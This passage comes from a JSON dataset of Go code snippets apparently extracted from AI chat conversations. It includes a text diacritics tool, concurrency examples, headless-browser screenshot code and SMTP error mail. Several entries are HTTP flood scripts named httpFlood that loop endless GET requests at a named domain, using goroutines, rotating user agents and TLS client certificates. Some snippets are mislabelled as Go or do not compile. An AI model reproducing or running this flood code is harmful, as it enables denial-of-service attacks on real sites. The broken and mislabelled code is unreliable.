zapisany do pliku qrcode.png\")\n}",
    "filename": "f4811cea60459f5dea93357f212f98c3_0.go"
  },
  {
    "conversation_hash": "0150533e4f8b7344303ed32175f2e122",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// Funkcja do czyszczenia ekranu\nfunc clearScreen() {\n\tcmd := exec.Command(\"cmd\", \"/c\", \"cls\") // Windows\n\tcmd.Stdout = os.Stdout\n\tcmd.Run()\n}",
    "filename": "0150533e4f8b7344303ed32175f2e122_1.go"
  },
  {
    "conversation_hash": "93e00c11032602d0fd5b10f88504d50d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\n\t\"golang.org/x/crypto/ssh\"\n)\n\nfunc handleSSHConnection(conn net.Conn, config *ssh.ServerConfig) {\n\t// Display a custom message when someone connects\n\tfmt.Println(\"Someone connected via SSH!\")\n\n\t// Perform further tasks or logic here if required\n\n\t// Close the connection to terminate the session.\n\tconn.Close()\n}\n\nfunc main() {\n\taddr := \":22\" // Port 22 is the standard SSH port\n\n\t// Configure SSH server with an empty configuration\n\tconfig := &ssh.ServerConfig{}\n\n\t// Start listening for SSH connections on the specified address\n\tlistener, err := net.Listen(\"tcp\", addr)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to start TCP listener: %v\", err)\n\t}\n\n\tdefer listener.Close()\n\n\tfor {\n\t\t// Accept incoming connections\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Failed to accept incoming connection: %v\", err)\n\t\t}\n\n\t\t// Start a new goroutine to handle each connection\n\t\tgo handleSSHConnection(conn, config)\n\t}\n}",
    "filename": "93e00c11032602d0fd5b10f88504d50d_1.go"
  },
  {
    "conversation_hash": "919ac26e913c30ba0996c3a8b4478cfb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Hang Purchase Example\", overlay=true)\n\nvar float bprice = na\nvar float bprice_1p = na\nvar float bprice_2p = na\nvar float bprice_3p = na\n\nvar bool hangingCancelled = false\n\nif crossover(sma(close, 10), sma(close, 20))\n    // First purchase, set initial buy price and hanging prices\n    bprice := close\n    bprice_1p := close * 1.01\n    bprice_2p := close * 1.02\n    bprice_3p := close * 1.03\n    hangingCancelled := false\n\nif crossunder(sma(close, 10), sma(close, 20)) and not hangingCancelled\n    // Opposite signal, cancel hanging\n    hangingCancelled := true\n\nif not hangingCancelled\n    // Place hanging orders\n    strategy.entry(\"Long 1\", strategy.long, stop=bprice_1p)\n    strategy.entry(\"Long 2\", strategy.long, stop=bprice_2p)\n    strategy.entry(\"Long 3\", strategy.long, stop=bprice_3p)",
    "filename": "919ac26e913c30ba0996c3a8b4478cfb_0.go"
  },
  {
    "conversation_hash": "e2c26f6cabab1c9c25fbbd721171f283",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"io/ioutil\"\n    \"strings\"\n)\n\nvar ogonki = map[string]string{\n    \"pl\": \"ąćłńóśźżęĄĆŁŃÓŚŹŻĘ\",\n    \"de\": \"äöüßÄÖÜẞ\",\n    \"fr\": \"éèàçêôûÉÈÀÇÊÔÛ\",\n    \"es\": \"áíóúéüñÁÍÓÚÉÜÑ\",\n}\n\nfunc main() {\n    flagHelp := flag.Bool(\"help\", false, \"Wyswietl pomoc\")\n    flagLang := flag.String(\"lang\", \"pl\", \"Jezyk ogonkow (pl, de, fr, es)\")\n\n    flag.Parse()\n\n    if *flagHelp {\n        printHelp()\n        return\n    }\n\n    inputFiles := flag.Args()\n\n    if len(inputFiles) == 0 {\n        fmt.Println(\"Blad: Nie podano sciezki do pliku.\")\n        return\n    }\n\n    for _, inputFile := range inputFiles {\n        if !isTextFile(inputFile) {\n            fmt.Printf(\"Plik %s nie jest plikiem tekstowym. Pomijam.\\n\", inputFile)\n            continue\n        }\n        \n        content, err := ioutil.ReadFile(inputFile)\n        if err != nil {\n            fmt.Printf(\"Blad podczas wczytywania pliku %s: %s\\n\", inputFile, err)\n            continue\n        }\n\n        newContent := replaceOgonki(string(content), *flagLang)\n\n        outputFile := strings.TrimSuffix(inputFile, \".txt\") + \"_modified.txt\"\n\n        err = ioutil.WriteFile(outputFile, []byte(newContent), 0644)\n        if err != nil {\n            fmt.Printf(\"Blad podczas zapisywania pliku %s: %s\\n\", outputFile, err)\n            continue\n        }\n\n        fmt.Printf(\"Zamiana ogonkow zakonczona pomyslnie. Nowy plik zostal zapisany jako %s.\\n\", outputFile)\n    }\n}\n\nfunc replaceOgonki(text string, lang string) string {\n    ogonkiLetters, ok := ogonki[lang]\n    if !ok {\n        fmt.Printf(\"Blad: Nieznany jezyk ogonkow %s.\\n\", lang)\n        return text\n    }\n\n    for _, ogonkiLetter := range ogonkiLetters {\n        replacement := string(ogonkiLetter)\n        text = strings.ReplaceAll(text, replacement, getReplacement(replacement))\n    }\n    return text\n}\n\nfunc getReplacement(letter string) string {\n    switch letter {\n    case \"ą\":\n        return \"a\"\n    case \"ć\":\n        return \"c\"\n    case \"ę\":\n        return \"e\"\n    case \"ł\":\n        return \"l\"\n    case \"ń\":\n        return \"n\"\n    case \"ó\":\n        return \"o\"\n    case \"ś\":\n        return \"s\"\n    case \"ź\":\n        return \"z\"\n    case \"ż\":\n        return \"z\"\n    case \"ä\":\n        return \"a\"\n    case \"ö\":\n        return \"o\"\n    case \"ü\":\n        return \"u\"\n    case \"ß\":\n        return \"ß\"\n    case \"é\":\n        return \"e\"\n    case \"á\":\n        return \"a\"\n    case \"í\":\n        return \"i\"\n    case \"ú\":\n        return \"u\"\n    case \"ñ\":\n        return \"u\"\n    case \"è\":\n        return \"e\"\n    case \"à\":\n        return \"a\"\n    case \"ç\":\n        return \"c\"\n    case \"ê\":\n        return \"e\"\n    case \"ô\":\n        return \"o\"\n    case \"û\":\n        return \"u\"\n    case \"Ą\":\n        return \"A\"\n    case \"Ć\":\n        return \"C\"\n    case \"Ę\":\n        return \"E\"\n    case \"Ł\":\n        return \"L\"\n    case \"Ń\":\n        return \"N\"\n    case \"Ó\":\n        return \"O\"\n    case \"Ś\":\n        return \"S\"\n    case \"Ź\":\n        return \"Z\"\n    case \"Ż\":\n        return \"Z\"\n    case \"Ä\":\n        return \"A\"\n    case \"Ö\":\n        return \"O\"\n    case \"Ü\":\n        return \"U\"\n    case \"É\":\n        return \"E\"\n    case \"Á\":\n        return \"A\"\n    case \"Í\":\n        return \"I\"\n    case \"Ú\":\n        return \"U\"\n    case \"Ñ\":\n        return \"N\"\n    case \"È\":\n        return \"E\"\n    case \"À\":\n        return \"A\"\n    case \"Ç\":\n        return \"C\"\n    case \"Ê\":\n        return \"e\"\n    case \"Ô\":\n        return \"O\"\n    case \"Û\":\n        return \"u\"\n    default:\n        return letter\n    }\n}\n\nfunc printHelp() {\n    fmt.Println(\"OGONKI v1.0 (c) by Łukasz Wójcik\")\n    fmt.Println(\"Program do zamiany 'ogonków' w plikach tekstowych\")\n    fmt.Println(\"Obsluguje jezyki: Polski, Hiszpanski, Niemiecki, Francuski\")\n    fmt.Println(\"https://github.com/lukaszwojcikdev/ogonki.git\")\n    fmt.Println()\n    fmt.Println(\"Uzycie: ogonki [-help] [-lang jezyk] [plik1.txt plik2.txt ...]\")\n    fmt.Println(\"Flagi: [-pl] [-es] [-fr] [-de]\")\n    flag.PrintDefaults()\n}\n\nfunc isTextFile(filename string) bool {\n    return strings.HasSuffix(filename, \".txt\")\n}",
    "filename": "e2c26f6cabab1c9c25fbbd721171f283_0.go"
  },
  {
    "conversation_hash": "cd50f91bb4bfa00f5456d0fbe72e23ca",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func setFont(f font.Face) {\n    fmt.Println()                                                                \n    fmt.Println(\"     _/_/      _/_/_/    _/_/    _/      _/  _/    _/  _/_/_/  \") \n    fmt.Println(\"  _/    _/  _/        _/    _/  _/_/    _/  _/  _/      _/      \")\n    fmt.Println(\" _/    _/  _/  _/_/  _/    _/  _/  _/  _/  _/_/        _/       \")\n    fmt.Println(\"_/    _/  _/    _/  _/    _/  _/    _/_/  _/  _/      _/     \")   \n    fmt.Println(\" _/_/      _/_/_/    _/_/    _/      _/  _/    _/  _/_/_/    \")   \n    fmt.Println()\n    fmt.Println(\"OGONKI v1.0 (c) by Łukasz Wójcik\")\n    fmt.Println(\"Program do zamiany 'ogonków' w plikach tekstowych niesformatowanych\")\n    fmt.Println()\n    fmt.Println(\"Obsluguje jezyki: Polski, Hiszpanski, Niemiecki, Francuski\")\n    fmt.Println()\n    fmt.Println(\"Uzycie: ogonki [-help] [-lang jezyk] [plik1.txt plik2.txt ...]\")\n    fmt.Println(\"Flagi: [pl] [es] [fr] [de]\")\n    fmt.Println(\"Przyklad uzycia: ogonki -lang fr file.txt\")\n    fmt.Println()\n    flag.PrintDefaults()\n    fmt.Println()\n    fmt.Println(\"Site:\")\n    fmt.Println(\"https://github.com/lukaszwojcikdev/ogonki.git\")\n}",
    "filename": "cd50f91bb4bfa00f5456d0fbe72e23ca_1.go"
  },
  {
    "conversation_hash": "cd50f91bb4bfa00f5456d0fbe72e23ca",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    // ...przed wywołaniem funkcji \"printHelp()\"\n    fontBytes, err := ioutil.ReadFile(\"/ścieżka/do/pliku/courier_new.ttf\") // podaj ścieżkę do pliku czcionki Courier New\n    if err != nil {\n        log.Fatal(err)\n    }\n    fontFace, err := truetype.Parse(fontBytes)\n    if err != nil {\n        log.Fatal(err)\n    }\n    context := freetype.NewContext()\n    context.SetFont(fontFace)\n    setFont(context)\n    // ...po wywołaniu funkcji \"setFont()\"\n}",
    "filename": "cd50f91bb4bfa00f5456d0fbe72e23ca_2.go"
  },
  {
    "conversation_hash": "7af2ea7ad1f915b542574a9b25b68ad1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"github.com/golang/freetype/truetype\"\n\t\"golang.org/x/image/font\"\n\t\"golang.org/x/image/font/gostatic\"\n\t\"io/ioutil\"\n\t\"log\"\n)\n\nfunc main() {\n\tfontPath := \"path/to/courier_new.ttf\" // ścieżka do pliku czcionki Courier New\n\n\t// Wczytaj plik czcionki\n\tfontBytes, err := ioutil.ReadFile(fontPath)\n\tif err != nil {\n\t\tlog.Fatal(\"Nie można wczytać pliku czcionki:\", err)\n\t}\n\n\t// Załaduj czcionkę\n\tfont, err := truetype.Parse(fontBytes)\n\tif err != nil {\n\t\tlog.Fatal(\"Nie można załadować czcionki:\", err)\n\t}\n\n\t// Ustaw czcionkę jako domyślną dla Println()\n\tfontFace := truetype.NewFace(font, &truetype.Options{Size: 12})\n\tfmt.Println(\"Tekst w czcionce Courier New\")\n\n\t// Użyj czcionki do wyświetlania tekstu\n\tpoint := freetype.Pt(10, 10)\n\tgostatic.DrawString(img, point, textToPrint, black, fontFace)\n}",
    "filename": "7af2ea7ad1f915b542574a9b25b68ad1_0.go"
  },
  {
    "conversation_hash": "b2c5791982e897a661315deb583de461",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc printANSIFile(filePath string) {\n\tcontent, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\tfmt.Printf(\"Error reading file: %v\", err)\n\t\treturn\n\t}\n\tfmt.Println(string(content))\n}\n\nfunc printAllANSIFiles(folderPath string) {\n\tfiles, err := ioutil.ReadDir(folderPath)\n\tif err != nil {\n\t\tfmt.Printf(\"Error reading folder: %v\", err)\n\t\treturn\n\t}\n\n\tfor _, file := range files {\n\t\tif filepath.Ext(file.Name()) == \".ans\" {\n\t\t\tfilePath := filepath.Join(folderPath, file.Name())\n\t\t\tprintANSIFile(filePath)\n\t\t\tfmt.Println(\"====================\") // Add a separator between files\n\t\t}\n\t}\n}\n\nfunc main() {\n\t// Specify the folder path where your ANSI files are stored\n\tfolderPath := \"/path/to/your/folder\"\n\n\tprintAllANSIFiles(folderPath)\n}",
    "filename": "b2c5791982e897a661315deb583de461_1.go"
  },
  {
    "conversation_hash": "b2c5791982e897a661315deb583de461",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc printANSIFile(filePath string) {\n\tcontent, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\tfmt.Printf(\"Error reading file: %v\", err)\n\t\treturn\n\t}\n\tfmt.Println(string(content))\n}\n\nfunc printAllANSIFiles(folderPath string) {\n\tfiles, err := ioutil.ReadDir(folderPath)\n\tif err != nil {\n\t\tfmt.Printf(\"Error reading folder: %v\", err)\n\t\treturn\n\t}\n\n\tfor _, file := range files {\n\t\tfilePath := filepath.Join(folderPath, file.Name())\n\t\tprintANSIFile(filePath)\n\t\tfmt.Println(\"====================\") // Add a separator between files\n\t}\n}\n\nfunc main() {\n\t// Check if folder path is provided as a command-line argument\n\tif len(os.Args) < 2 {\n\t\tfmt.Println(\"Please provide the folder path as a command-line argument.\")\n\t\treturn\n\t}\n\n\tfolderPath := os.Args[1]\n\tprintAllANSIFiles(folderPath)\n}",
    "filename": "b2c5791982e897a661315deb583de461_3.go"
  },
  {
    "conversation_hash": "b2c5791982e897a661315deb583de461",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc printANSIFile(filePath string) {\n\tcontent, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\tfmt.Printf(\"Error reading file: %v\", err)\n\t\treturn\n\t}\n\tfmt.Println(string(content))\n}\n\nfunc printAllANSIFiles(folderPath string) {\n\tfiles, err := ioutil.ReadDir(folderPath)\n\tif err != nil {\n\t\tfmt.Printf(\"Error reading folder: %v\", err)\n\t\treturn\n\t}\n\n\tfor _, file := range files {\n\t\tfilePath := filepath.Join(folderPath, file.Name())\n\t\tprintANSIFile(filePath)\n\t\tfmt.Println(\"====================\") // Add a separator between files\n\t}\n}\n\nfunc main() {\n\t// Specify the relative folder path where your ANSI files are stored\n\tfolderPath := \"folder/branding\"\n\n\t// Get the absolute path of the current working directory\n\twd, err := os.Getwd()\n\tif err != nil {\n\t\tfmt.Printf(\"Error getting current working directory: %v\", err)\n\t\treturn\n\t}\n\n\t// Combine the working directory path with the relative folder path\n\tabsoluteFolderPath := filepath.Join(wd, folderPath)\n\n\tprintAllANSIFiles(absoluteFolderPath)\n}",
    "filename": "b2c5791982e897a661315deb583de461_5.go"
  },
  {
    "conversation_hash": "831aaad210fa71dbeb895d642e92fc26",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        renderscriptTargetApi 19\n        renderscriptSupportModeEnabled true\n    }\n}",
    "filename": "831aaad210fa71dbeb895d642e92fc26_2.go"
  },
  {
    "conversation_hash": "831aaad210fa71dbeb895d642e92fc26",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        renderscriptTargetApi 19\n        renderscriptSupportModeEnabled true\n    }\n}",
    "filename": "831aaad210fa71dbeb895d642e92fc26_7.go"
  },
  {
    "conversation_hash": "9b8a2e6672d0a860a16e6cf52d004dae",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"time\"\n\n\t\"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n\tctx, cancel := chromedp.NewContext(context.Background())\n\tdefer cancel()\n\n\tvar buf []byte\n\tif err := chromedp.Run(ctx,\n\t\tchromedp.Navigate(\"https://example.com\"),\n\t\tchromedp.CaptureScreenshot(&buf),\n\t); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tif err := chromedp.Cancel(ctx); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tif err := chromedp.Wait(ctx); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tlog.Println(\"Capture successful!\")\n\t// do something with the screenshot data in 'buf'\n}",
    "filename": "9b8a2e6672d0a860a16e6cf52d004dae_1.go"
  },
  {
    "conversation_hash": "9b8a2e6672d0a860a16e6cf52d004dae",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n\tendpoints := []string{\"https://shitflare.asia/?pagee=1\", \"https://shitflare.asia/?pagee=2\", \"https://shitflare.asia/?pagee=3\"}\n\tfor _, endpoint := range endpoints {\n\t\tfmt.Printf(\"Opening page: %s\\n\", endpoint)\n\t\tif err := openWebPage(endpoint); err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t\ttime.Sleep(2 * time.Second) // Wait for some time before opening the next page\n\t}\n}\n\nfunc openWebPage(endpoint string) error {\n\tctx, cancel := chromedp.NewContext(context.Background())\n\tdefer cancel()\n\n\t// Create a buffer to capture a screenshot\n\tvar buf []byte\n\toptions := append(chromedp.DefaultExecAllocatorOptions[:],\n\t\tchromedp.Flag(\"headless\", false), // Run in visible mode\n\t\tchromedp.Flag(\"disable-gpu\", true),\n\t\tchromedp.Flag(\"mute-audio\", true),\n\t\tchromedp.WindowSize(1920, 1080), // Set a custom window size if needed\n\t)\n\n\tallocatorContext, cancelAllocator := chromedp.NewExecAllocator(context.Background(), options...)\n\tdefer cancelAllocator()\n\tctx, cancel = chromedp.NewContext(allocatorContext)\n\tdefer cancel()\n\n\t// Open the webpage and capture a screenshot\n\tif err := chromedp.Run(ctx,\n\t\tchromedp.Navigate(endpoint),\n\t\tchromedp.CaptureScreenshot(&buf),\n\t); err != nil {\n\t\treturn err\n\t}\n\n\t// Save the captured screenshot to a file (optional)\n\tfilename := strings.ReplaceAll(endpoint, \"https://\", \"\")\n\tfilename = strings.ReplaceAll(filename, \"http://\", \"\")\n\tfilename = strings.ReplaceAll(filename, \"/\", \"_\") + \".png\"\n\tif err := saveScreenshotToFile(buf, filename); err != nil {\n\t\treturn err\n\t}\n\n\tfmt.Printf(\"Screenshot saved to: %s\\n\", filename)\n\treturn nil\n}\n\nfunc saveScreenshotToFile(buf []byte, filename string) error {\n\treturn chromedp.SaveScreenshot(filename, buf)\n}",
    "filename": "9b8a2e6672d0a860a16e6cf52d004dae_2.go"
  },
  {
    "conversation_hash": "af6787315f7b20ed7b7af7674833a075",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tfmt.Println(\"Welcome to the CLI app!\")\n\n\tfor {\n\t\tfmt.Print(\"> \")\n\t\tinput, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Println(\"An error occurred:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tcommand := strings.TrimSpace(input)\n\n\t\tswitch command {\n\t\tcase \"help\":\n\t\t\tfmt.Println(\"Available commands: help, whoami, exit\")\n\t\tcase \"whoami\":\n\t\t\tfmt.Println(os.Getenv(\"USER\"))\n\t\tcase \"exit\":\n\t\t\tif os.Getuid() == 0 {\n\t\t\t\tfmt.Println(\"Exiting the app...\")\n\t\t\t\treturn\n\t\t\t}\n\t\t\tfmt.Println(\"You are not root and cannot exit the app.\")\n\t\tdefault:\n\t\t\tfmt.Println(\"Invalid command. Type 'help' to see available commands.\")\n\t\t}\n\t}\n}",
    "filename": "af6787315f7b20ed7b7af7674833a075_0.go"
  },
  {
    "conversation_hash": "6bc2ed67911971b12ad5148fac90e502",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    // Start a new goroutine concurrently\n    go task1()\n\n    // Execute another task in the main goroutine\n    task2()\n\n    // Wait for the goroutine to finish executing\n    time.Sleep(time.Second)\n}\n\nfunc task1() {\n    // Perform some time-consuming task\n}\n\nfunc task2() {\n    // Perform some other task\n}",
    "filename": "6bc2ed67911971b12ad5148fac90e502_0.go"
  },
  {
    "conversation_hash": "6bc2ed67911971b12ad5148fac90e502",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    taskQueue := make(chan Task, 10) // Task is a struct defining a task\n\n    // Start 5 worker goroutines\n    for i := 0; i < 5; i++ {\n        go worker(i, taskQueue)\n    }\n\n    // Add tasks to the queue\n    for _, task := range tasks {\n        taskQueue <- task\n    }\n\n    // Close the task queue once all tasks are added\n    close(taskQueue)\n\n    // Wait for all worker goroutines to finish\n    wg.Wait()\n}\n\nfunc worker(id int, taskQueue chan Task) {\n    for task := range taskQueue {\n        // Process the task\n    }\n    wg.Done() // Notify the WaitGroup that this worker is done\n}",
    "filename": "6bc2ed67911971b12ad5148fac90e502_1.go"
  },
  {
    "conversation_hash": "6bc2ed67911971b12ad5148fac90e502",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"net/http\"\n)\n\nfunc main() {\n    url := \"<your-url>\"\n    userAgent := \"My Custom User Agent\"\n\n    req, err := http.NewRequest(\"GET\", url, nil)\n    if err != nil {\n        panic(err)\n    }\n\n    req.Header.Set(\"User-Agent\", userAgent)\n\n    client := http.DefaultClient\n    resp, err := client.Do(req)\n    if err != nil {\n        panic(err)\n    }\n\n    defer resp.Body.Close()\n\n    // Process the response...\n}",
    "filename": "6bc2ed67911971b12ad5148fac90e502_3.go"
  },
  {
    "conversation_hash": "6bc2ed67911971b12ad5148fac90e502",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"net/http\"\n\t\"fmt\"\n)\n\nfunc httpFlood() {\n\tfor {\n\t\turl := \"https://se1zed.cc\"\n\n\t\treq, _ := http.NewRequest(\"GET\", url, nil)\n\t\treq.Header.Set(\"User-Agent\", \"My Custom User Agent\")\n\n\t\thttp.DefaultClient.Do(req)\n\n\t\tfmt.Println(\"wtfff\")\n\t}\n}\n\nfunc main() {\n\tthreads := 1 // Localhost - 3, External - any\n\n\tfor i := 0; i < threads-1; i++ {\n\t\tgo httpFlood()\n\t}\n\n\thttpFlood()\n}",
    "filename": "6bc2ed67911971b12ad5148fac90e502_4.go"
  },
  {
    "conversation_hash": "661aa81f99d56d2d02fbd313eb86feeb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Set the seed for random number generation\n\trand.Seed(time.Now().UnixNano())\n\n\t// Array of choices\n\tchoices := []string{\"apple\", \"banana\", \"orange\", \"kiwi\"}\n\n\t// Generate a random index\n\trandomIndex := rand.Intn(len(choices))\n\n\t// Get the random choice\n\trandomChoice := choices[randomIndex]\n\n\tfmt.Println(\"Random choice:\", randomChoice)\n}",
    "filename": "661aa81f99d56d2d02fbd313eb86feeb_0.go"
  },
  {
    "conversation_hash": "661aa81f99d56d2d02fbd313eb86feeb",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc main() {\n\t// Create a custom Transport with the desired TLS configuration\n\ttransport := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tClientAuth: tls.RequireAndVerifyClientCert,\n\t\t\t// Add other TLS configuration options as needed\n\t\t},\n\t}\n\n\t// Create an HTTP client with the custom Transport\n\tclient := &http.Client{\n\t\tTransport: transport,\n\t}\n\n\t// Make an HTTP request\n\tresponse, err := client.Get(\"https://example.com\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer response.Body.Close()\n\n\t// Do something with the response\n\tfmt.Println(\"Response Status:\", response.Status)\n}",
    "filename": "661aa81f99d56d2d02fbd313eb86feeb_2.go"
  },
  {
    "conversation_hash": "853caf210eadf085f39e1b4af4930df4",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"math/rand\"\n\t\"net/http\"\n)\n\nfunc httpFlood(UAs []string) {\n\t// Load the root CA certificate\n\tcaCert, err := ioutil.ReadFile(\"path/to/rootCA.crt\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Create a certificate pool and add the CA certificate to it\n\tcaCertPool := x509.NewCertPool()\n\tcaCertPool.AppendCertsFromPEM(caCert)\n\n\ttransport := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            caCertPool,\n\t\t\tInsecureSkipVerify: false, // Make sure to verify the server's certificate\n\t\t\tClientAuth:         tls.RequireAndVerifyClientCert,\n\t\t},\n\t}\n\n\tclient := &http.Client{\n\t\tTransport: transport,\n\t}\n\n\tfor {\n\t\turl := \"https://se1zed.cc\"\n\t\tUA := UAs[rand.Intn(len(UAs))]\n\n\t\treq, _ := http.NewRequest(\"GET\", url, nil)\n\t\treq.Header.Set(\"User-Agent\", UA)\n\n\t\tclient.Do(req)\n\n\t\tfmt.Println(\"wtfff\")\n\n\t}\n}\n\nfunc main() {\n\t// ...\n}",
    "filename": "853caf210eadf085f39e1b4af4930df4_0.go"
  },
  {
    "conversation_hash": "853caf210eadf085f39e1b4af4930df4",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"math/rand\"\n\t\"net/http\"\n)\n\nfunc httpFlood(UAs []string) {\n\t// Load the client certificate and key\n\tcert, err := tls.LoadX509KeyPair(\"path/to/client.crt\", \"path/to/client.key\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Load the root CA certificate\n\tcaCert, err := ioutil.ReadFile(\"path/to/rootCA.crt\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Create a certificate pool and add the CA certificate to it\n\tcaCertPool := x509.NewCertPool()\n\tcaCertPool.AppendCertsFromPEM(caCert)\n\n\ttransport := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:      caCertPool,\n\t\t\tCertificates: []tls.Certificate{cert},\n\t\t\tClientAuth:   tls.RequireAndVerifyClientCert,\n\t\t},\n\t}\n\n\tclient := &http.Client{\n\t\tTransport: transport,\n\t}\n\n\tfor {\n\t\turl := \"https://se1zed.cc\"\n\t\tUA := UAs[rand.Intn(len(UAs))]\n\n\t\treq, _ := http.NewRequest(\"GET\", url, nil)\n\t\treq.Header.Set(\"User-Agent\", UA)\n\n\t\tclient.Do(req)\n\n\t\tfmt.Println(\"wtfff\")\n\n\t}\n}\n\nfunc main() {\n\t// ...\n}",
    "filename": "853caf210eadf085f39e1b4af4930df4_1.go"
  },
  {
    "conversation_hash": "fea1a18c5b26ff66ec550cf90eaafcb0",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc add(a, b int) int {\n    return a + b\n}\n\nfunc main() {\n    result := add(5, 10)\n    fmt.Println(result)\n}",
    "filename": "fea1a18c5b26ff66ec550cf90eaafcb0_1.go"
  },
  {
    "conversation_hash": "f2dcb99cd84ac3afda8c1d4633d43d8b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"net/smtp\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Your code that might produce an error\n\terr := doSomething()\n\tif err != nil {\n\t\t// Send an email with the error details\n\t\terr := sendEmail(\"example@gmail.com\", \"Error occurred\", err.Error())\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Failed to send email: %v\", err)\n\t\t}\n\n\t\t// Log the error\n\t\tlog.Fatalf(\"An error occurred: %v\", err)\n\t}\n\n\t// Continue with the rest of your code\n}\n\nfunc doSomething() error {\n\t// Your implementation that may cause an error\n\treturn nil\n}\n\nfunc sendEmail(to, subject, body string) error {\n\tfrom := os.Getenv(\"SMTP_USERNAME\") // Replace with your email address\n\tpassword := os.Getenv(\"SMTP_PASSWORD\") // Replace with your email password\n\n\t// SMTP server configuration\n\tsmtpServer := \"smtp.gmail.com\"\n\tsmtpPort := \"587\"\n\n\t// Message setup\n\tmessage := []byte(\"To: \" + to + \"\\r\\n\" +\n\t\t\"Subject: \" + subject + \"\\r\\n\" +\n\t\t\"\\r\\n\" +\n\t\tbody)\n\n\t// Authentication\n\tauth := smtp.PlainAuth(\"\", from, password, smtpServer)\n\n\t// Sending the email\n\terr := smtp.SendMail(smtpServer+\":\"+smtpPort, auth, from, []string{to}, message)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}",
    "filename": "f2dcb99cd84ac3afda8c1d4633d43d8b_0.go"
  },
  {
    "conversation_hash": "3eb076d90b2400f2756be0c30614cfe4",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
